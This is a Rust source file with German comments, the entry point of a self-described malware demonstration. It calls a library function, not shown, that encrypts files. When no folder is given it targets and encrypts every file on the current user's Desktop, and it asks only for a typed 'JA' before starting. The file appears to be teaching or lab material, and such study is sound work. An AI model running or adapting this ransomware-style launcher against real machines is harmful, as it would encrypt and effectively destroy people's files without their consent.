use rust_mw::run_malware_demo;
use std::env;
use std::io::{self, Write};
use std::path::PathBuf;

// Anleitung
// Software für Demonstrationszwecke (Malware)
//
// Vor dem Start:
// Es gibt zwei mögliche Modi:
//
// 1. Sicherer Modus für Tests
//  Kann verwendet werden, um die Software in einem isolierten Ordner zu testen.
//  Dabei wird der Pfad als Argument übergeben.
//  ! Achtung: Trennzeichen -- beachten, damit Cargo das Argument für das Programm verwendet
//
//  Befehl im Termminal:
//  cargo run -- <PFAD_ZUM_ORDNER>
//
//  Beispiel:
//    > cargo run -- "C:\Users\Name\Desktop\TestLabor"   (Windows)
//    > cargo run -- ./test_ordner                       (Linux / macOS)
//
//  2. Desktop Modus (eigentlich angedachter Modus, der alle auf dem Desktop gespeicherten Dateien
//     verschlüsselt)
//     Wird KEIN Pfad angegeben, wird automatisch der Desktop verwendet (Desktop des aktuellen
//     Nutzers)
//
//     Befehl (Terminal)
//     cargo run
//
//
//     !! Dieser Modus verschlüsselt alle auf dem Desktop gespeicherten Dateien
//
//     SICHERHEITS-MECHANISMUS: Egal welcher Modus gewählt wird, das Programm startet nicht sofort,
//     sondern zeigt das erkannte Zielverzeichnis an und verlangt eine manuelle Bestätigtung mit
//     "JA".

fn main() {
    // args().nth(1) Erstes Argument auslesen: Ordener der verschlüsselt werden soll
    let args: Vec<String> = env::args().collect();

    let target_path = if args.len() > 1 {
        // Wenn ein Pfad übergeben wurde
        let path = PathBuf::from(&args[1]);

        // Testen ob der Pfad existiert
        if !path.exists() {
            eprintln!("Fehler: Angegebener Pfad existiert nicht: {:?}", path);
            return;
        }
        path
    } else {
        // Sonst: Desktop als zu verschlüsselnder Ordner (! Achtung)
        match dirs::desktop_dir() {
            Some(path) => path,
            None => {
                eprintln!("Fehler: Deskopt nicht gefunden");
                return;
            }
        }
    };

    // ---------------------------------------------------------
    // SICHERHEITS-ABFRAGE
    // ---------------------------------------------------------
    println!("!!! ACHTUNG: MALWARE DEMO MODE !!!");
    println!("------------------------------------------------");
    println!("Das Programm zielt auf folgendes Verzeichnis:");
    println!("{:?}", target_path);
    println!("------------------------------------------------");
    println!("Alle Dateien in diesem Ordner werden verschlüsselt !!");

    // Wird ein Nutzerpfad übergeben: Hinweis auf Benutzerpfad ausgeben
    if args.len() > 1 {
        println!("(Benutzerdefinierter Test-Pfad erkannt)");
    } else {
        println!("(Standard-Ziel: Desktop erkannt)");
    }

    print!("\nSoll der Code ausgeführt werden? 'JA' (großgeschrieben) zum Starten: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Fehler beim Lesen");

    if input.trim() != "JA" {
        println!("Abbruch: Nutzereingabe != JA");
        return;
    }

    // Prozess starten
    println!("\n-> Starte Prozess auf: {:?}", target_path);

    match target_path.to_str() {
        Some(path_str) => {
            // Funktion aus lib.rs aufrufen
            match run_malware_demo(path_str) {
                Ok(_) => println!("Vorgang erfolgreich."),
                Err(e) => eprintln!("Fehler: {}", e),
            }
        }
        None => eprintln!("Ungültiger Pfad (Encoding Fehler)."),
    }

    // Warten vor dem Schließen
    println!("\nDrücke ENTER zum Beenden.");
    let mut _pause = String::new();
    io::stdin().read_line(&mut _pause).ok();
}
